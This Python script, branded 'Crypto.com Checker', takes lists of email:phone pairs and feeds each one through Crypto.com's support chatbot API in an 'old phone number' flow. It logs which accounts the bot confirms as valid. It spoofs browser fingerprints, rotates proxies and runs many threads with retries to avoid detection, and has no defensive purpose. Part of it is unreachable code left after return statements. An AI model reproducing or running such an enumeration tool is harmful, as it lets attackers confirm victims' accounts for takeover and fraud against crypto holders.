import random
import toml
import curl_cffi
import re
import time
import phonenumbers
import pycountry
import json

from uuid import uuid4
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import wraps
from enum import Enum
from logmagix import Logger, Home
from phonenumbers import geocoder

with open('input/config.toml') as f:
    config = toml.load(f)

DEBUG = config['dev'].get('Debug', False)

log = Logger()

def debug(func_or_message, *args, **kwargs) -> callable:
    if callable(func_or_message):
        @wraps(func_or_message)
        def wrapper(*args, **kwargs):
            result = func_or_message(*args, **kwargs)
            if DEBUG:
                log.debug(f"{func_or_message.__name__} returned: {result}")
            return result
        return wrapper
    else:
        if DEBUG:
            log.debug(f"Debug: {func_or_message}")

def debug_response(response) -> None:
    debug(response.headers)
    debug(response.cookies.get_dict())
    try:
        debug(response.text)
    except:
        debug(response.content)
    debug(response.status_code)

class Status(Enum):
    INVALID = 0
    VALID = 1
    ERROR = 2

class Miscellaneous:
    @debug
    def get_proxies(self) -> dict:
        try:
            if config['dev'].get('Proxyless', False):
                return None
                
            with open('input/proxies.txt') as f:
                proxies = [line.strip() for line in f if line.strip()]
                if not proxies:
                    log.warning("No proxies available. Running in proxyless mode.")
                    return None
                
                proxy_choice = random.choice(proxies)
                proxy_dict = {
                    "http": f"http://{proxy_choice}",
                    "https": f"http://{proxy_choice}"
                }
                log.debug(f"Using proxy: {proxy_choice}")
                return proxy_dict
        except FileNotFoundError:
            log.failure("Proxy file not found. Running in proxyless mode.")
            return None

    @debug 
    def get_user_agent(self) -> str:

        response = curl_cffi.get("https://raw.githubusercontent.com/ptraced/latest-useragents/refs/heads/main/useragents.json")

        if response.status_code == 200:
            # Try standard JSON parse first
            try:
                ua_list = response.json().get("Desktop_Useragents")
                if ua_list:
                    return random.choice(ua_list)
            except Exception:
                # Try a tolerant parse: remove trailing commas before closing brackets/braces
                try:
                    text = response.text
                    cleaned = re.sub(r",\s*(?=[\]}])", "", text)
                    parsed = json.loads(cleaned)
                    ua_list = parsed.get("Desktop_Useragents")
                    if ua_list:
                        return random.choice(ua_list)
                except Exception:
                    # Give up and fall back
                    log.warning("Failed to parse remote user agents; using default user agent")
        else:
            log.warning("Failed to fetch latests user agent using default one")

        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

    @debug
    def get_phone_region(self, number: str, lang: str = "en"):
        try:
            # Accept numbers passed as strings; if a set/list is accidentally passed, coerce to string
            if isinstance(number, (set, list, tuple)):
                number = next(iter(number)) if number else ""

            parsed_number = phonenumbers.parse(number, None)
            region = geocoder.description_for_number(parsed_number, lang)
            country_code = phonenumbers.region_code_for_number(parsed_number)
            country = pycountry.countries.get(alpha_2=country_code).name if country_code else None


            # Format as +CountryCodeNumber without spaces/dashes
            formatted = f"+{parsed_number.country_code} {parsed_number.national_number}"

            return {
                "valid": phonenumbers.is_valid_number(parsed_number),
                "country_code": country_code,
                "region": region,
                "country": country,
                "formatted": formatted
            }
        except Exception as e:
            return {"error": str(e)}

class AccountChecker:
    def __init__(self, misc: Miscellaneous, proxy_dict: dict):
        self.id = f"web{str(uuid4())}"
        self.client_chat_id = None
        self.misc = misc

        # Initialize the session
        self.session = curl_cffi.Session(impersonate="chrome136", http_version="v1")

        self.session.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Host": "alfred-gateway.crypto.com",
            "Origin": "https://chat.crypto.com",
            "Referer": "https://chat.crypto.com/",
            "sec-ch-ua": '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": misc.get_user_agent(),
            "X-CRYPTO-USER-UUID": self.id,
            "X-User-Type": "web"
        }
        self.session.proxies = proxy_dict

    @debug
    def get_authorization_token(self, id: str = None) -> str | None:
        data = {"user_id": id if id is not None else self.id}

        response = self.session.post("https://alfred-gateway.crypto.com/user/token", json=data)

        debug_response(response)

        if response.status_code == 201:
            token = response.json().get("token")
            self.session.headers['Authorization'] = f"Bearer {token}"
             
            return token
        else:
            log.failure(f"Failed to fetch authorization token: {response.text}, {response.status_code}")
        return None

    @debug
    def create_chat(self) -> bool:
        data = {
            "channel_id": "web",
            "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
            "last_chat_message": True,
            "country": "FRA"
        }

        response = self.session.post("https://alfred-gateway.crypto.com/conversations/messages", json=data)
        
        debug_response(response)

        if response.status_code == 201:
            return True
        else:
            log.failure(f"Failed to create chat: {response.text}, {response.status_code}")
        
        return False
    
    @debug
    def send_initial_message(self) -> bool:
        data = {
            "channel_id": "web",
            "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
            "content": "",  
            "message_type": 12,
            "transient": True
        }

        response = self.session.post("https://alfred-gateway.crypto.com/conversations/text", json=data)

        debug_response(response)

        if response.status_code == 201:
            return True
        else:
            log.failure(f"Failed to send initial id: {response.text}, {response.status_code}")
        
        return False

    @debug
    def set_language(self) -> str | None:
        data = {
            "channel_id": "web",
            "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
            "content": "21916380-9a81-4b10-935b-df8850bc6984",
            "new_conversation": True,
            "message_type": 12,
            "language": "en",
            "assistant_id": "en-0-8-2",
            "assistant_name": "General Support",
            "node_id": "21916380-9a81-4b10-935b-df8850bc6984",
            "session_info": {
                "user_type": "web",
                "region": "fr",
                "country": "FRA",
                "currency": "EUR",
                "language": "en",
                "assistant_id": "en-0-8-2",
                "assistant_name": "General Support"
            }
        }

        response = self.session.post("https://alfred-gateway.crypto.com/conversations/text", json=data)

        debug_response(response)

        if response.status_code == 201:
            chat_id = response.json().get("client_chat_id")
            
            self.client_chat_id = chat_id
            
            return chat_id
        else:
            log.failure(f"Failed to set language: {response.text}, {response.status_code}")
        
        return None
    
    @debug
    def set_type(self) -> bool:
        data = {
            "channel_id": "web",
            "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
            "content": "75068320-23cb-4f4d-a2a1-26208c827f51",
            "message_type": 12,
            "client_chat_id": self.client_chat_id
        }

        response = self.session.post("https://alfred-gateway.crypto.com/conversations/text", json=data)

        debug_response(response)

        if response.status_code == 201:
            return True
        else:
            log.failure(f"Failed to set phone: {response.text}, {response.status_code}")
        
        return False

    @debug
    def set_phone(self) -> bool:
        data = {
            "channel_id": "web",
            "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
            "content": "728e6650-e2f1-4477-9be8-decb67b43d4b",
            "message_type": 12,
            "client_chat_id": self.client_chat_id
        }

        response = self.session.post("https://alfred-gateway.crypto.com/conversations/text", json=data)

        debug_response(response)

        if response.status_code == 201:
            return True
        else:
            log.failure(f"Failed to set agreement: {response.text}, {response.status_code}")
        
        return False
    
    @debug
    def set_agreement(self) -> bool:
        data = {
            "channel_id": "web",
            "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
            "content": "a1fc60f7-adda-4aab-b07e-7aa2917b3c35",
            "message_type": 12,
            "client_chat_id": self.client_chat_id
        }

        response = self.session.post("https://alfred-gateway.crypto.com/conversations/text", json=data)

        debug_response(response)

        if response.status_code == 201:
            return True
        else:
            log.failure(f"Failed to set agreement: {response.text}, {response.status_code}")
        
        return False
    
    @debug
    def set_further_assistance(self) -> bool:
        data = {
            "channel_id": "web",
            "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
            "content": "c1ae35db-c5c7-4d6b-89e9-277d3ba3c6a0",
            "message_type": 12,
            "client_chat_id": self.client_chat_id
        }

        response = self.session.post("https://alfred-gateway.crypto.com/conversations/text", json=data)

        debug_response(response)

        if response.status_code == 201:
            return True
        else:
            log.failure(f"Failed to set further assistance: {response.text}, {response.status_code}")
        
        return False
    
    @debug
    def submit(self, email: str, phone: str) -> Status:
        phone_data = self.misc.get_phone_region(phone)

        # Use != for string comparison and handle missing keys safely
        region = phone_data.get("region")
        country_name = phone_data.get("country") or "Unknown"
        country = f"{country_name} (except New York)" if region != "New York" else country_name

        data = {
            "channel_id": "web",
            "influencer_id": "ab7d6750-10a2-4a09-87cd-6f2b68be100f",
            "content": f"Old phone number: {phone_data.get('formatted')}\nCountry/region: {country}\nEmail: {email}",
            "message_type": 1,
            "client_chat_id": self.client_chat_id
        }

        response = self.session.post("https://alfred-gateway.crypto.com/conversations/text", json=data)

        debug_response(response)

        if response.status_code == 201:
            if "Thank you for" in response.json().get("text"):
                return Status.VALID
            else:
                return Status.INVALID
        else:
            log.failure(f"Failed to sumbit chat: {response.text}, {response.status_code}")

            return Status.ERROR

    # Increase timeout to handle slow server responses
        self.session.timeout = 120  # Set timeout to 120 seconds

        # Retry logic with exponential backoff
        def retry_request(func, *args, retries=3, backoff=2, **kwargs):
            for attempt in range(1, retries + 1):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    log.warning(f"Attempt {attempt} failed: {e}")
                    if attempt == retries:
                        raise
                    time.sleep(backoff ** attempt)

        # Update proxy handling to switch proxies on failure
        def get_next_proxy():
            try:
                with open('input/proxies.txt') as f:
                    proxies = [line.strip() for line in f if line.strip()]
                for proxy in proxies:
                    yield {
                        'http': f'http://{proxy}',
                        'https': f'http://{proxy}'
                    }
            except FileNotFoundError:
                log.failure("Proxy file not found. Running in proxyless mode.")
                yield None

        self.proxy_generator = get_next_proxy()

        def switch_proxy():
            try:
                self.session.proxies = next(self.proxy_generator)
                log.debug(f"Switched to proxy: {self.session.proxies}")
            except StopIteration:
                log.failure("No more proxies available.")
                self.session.proxies = None

        # Call switch_proxy initially to set the first proxy
        switch_proxy()

        # Handle Cloudflare 502 Bad Gateway
        def handle_response(response):
            if response.status_code == 502:
                log.warning("Received 502 Bad Gateway. Retrying...")
                raise Exception("502 Bad Gateway")
            return response

def check_account(email: str, phone: str) -> bool:
    try:
        Misc = Miscellaneous()
        proxies = Misc.get_proxies()
        Checker = AccountChecker(Misc, proxies)

        log.info(f"Checking {email[:12]}...")
        if Checker.get_authorization_token():
            if Checker.create_chat():
                if Checker.send_initial_message():
                    if Checker.set_language():
                        if Checker.set_type():
                            if Checker.set_phone():
                                if Checker.set_agreement():
                                    if Checker.set_further_assistance():
                                        status = Checker.submit(email, phone)

                                        if status == Status.VALID:
                                            with open("output/valid.txt", "a", encoding='utf-8') as f:
                                                f.write(f"{email}:{phone}\n")
                                            
                                            log.success(f"Valid account: {email[:12]}...")

                                        elif status == Status.INVALID:
                                            with open("output/invalid.txt", "a", encoding='utf-8') as f:
                                                f.write(f"{email}:{phone}\n")
                                            
                                            log.failure(f"Invalid account: {email[:12]}...", level="INVALID")
                                        else:
                                            return False

        return True
    except Exception as e:
        log.failure(f"Error during account checking process: {e}")
        return False


def parse_account_line(line: str):
    if "," in line:  # CSV-like format
        parts = line.split(",")
        if len(parts) >= 6:
            email = parts[-1].strip()
            phone = parts[-2].strip()
            # Ensure phone starts with '+'
            if not phone.startswith("+"):
                phone = f"+{phone}"
            return email, phone
    elif ":" in line:  # email:phone format
        email, phone = line.split(":", 1)
        # Ensure phone starts with '+'
        if not phone.startswith("+"):
            phone = f"+{phone}"
        return email.strip(), phone.strip()
    else:
        log.warning(f"Skipping malformed account line: {line.strip()}")
        return None, None

def main() -> None:
    try:
        Banner = Home("Crypto.com Checker", align="center", credits="discord.cyberious.xyz")
        
        # Display Banner
        Banner.display()
        thread_count = config['dev'].get('Threads', 1)

        # Read accounts from input/accounts.txt (format: email:phone or CSV-like)
        accounts = []
        try:
            with open('input/accounts.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    email, phone = parse_account_line(line)
                    if email and phone:
                        accounts.append((email, phone))
        except FileNotFoundError:
            log.failure('input/accounts.txt not found')
            return

        # Worker that attempts check_account up to 3 times on False
        def worker(email_phone):
            email, phone = email_phone
            max_retries = 3
            for attempt in range(1, max_retries + 1):
                try:
                    success = check_account(email, phone)
                    if success:
                        return True
                    else:
                        log.warning(f"Attempt {attempt} failed for {email}. Retrying...")
                except Exception as e:
                    log.failure(f"Exception on attempt {attempt} for {email}: {e}")
                time.sleep(0.5)

            # All retries exhausted; record into error.txt
            with open('output/error.txt', 'a', encoding='utf-8') as ef:
                ef.write(f"{email}:{phone}\n")
            log.failure(f"Exhausted retries for {email}. Recorded to output/error.txt")
            return False

        # Process accounts with a thread pool
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = {executor.submit(worker, acc): acc for acc in accounts}
            for fut in as_completed(futures):
                acc = futures[fut]
                try:
                    fut.result()
                except Exception as e:
                    log.failure(f"Unhandled exception processing {acc[0]}: {e}")

    except KeyboardInterrupt:
        log.info("Process interrupted by user. Exiting...")
    except Exception as e:
        log.failure(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    main()